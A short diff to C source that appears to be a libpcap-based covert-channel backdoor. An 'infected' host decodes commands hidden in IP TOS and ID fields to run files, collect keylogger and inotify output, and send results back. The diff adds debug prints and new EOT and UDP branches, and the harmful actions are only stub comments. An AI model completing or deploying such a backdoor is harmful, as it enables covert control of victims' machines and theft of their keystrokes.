@@ -25,7 +25,9 @@ int Packetcapture(char *filter, struct filter Filter){
     if(pcap_setfilter(interfaceinfo, &fp) == -1){
         perror("pcap_setfilter");
     }
-        pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
+
+    //main loop for receiving
+    pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
     return 0;
 }
 
@@ -167,13 +169,22 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     //infected machine receiving a command
     } else if(Filter->infected == true) {
         if(CheckKey(ip->ip_tos, ip->ip_id) == COMMAND){
+            printf("COMMAND\n");
             //write command to .cmd
             //CHMOD it
             //run the file and pipe to results file
         } else if(CheckKey(ip->ip_tos, ip->ip_id) == KEYLOGGER) {
+            printf("KEYLOGGER\n");
             //copy keylogger file to results file
         } else if(CheckKey(ip->ip_tos, ip->ip_id) == INOTIFY) {
+            printf("INOTIFY\n");
             //copy inotify file to results file
+        } else if(CheckKey(ip->ip_tos, ip->ip_id) == EOT) {
+            printf("EOT\n");
+            //EOT, stop receiving and start sending
+        } else if(CheckKey(ip->ip_tos, ip->ip_id) == UDPCOMMAND) {
+            printf("UDP\n");
+            //EOT, stop receiving and start sending
         }
 
         //send results file
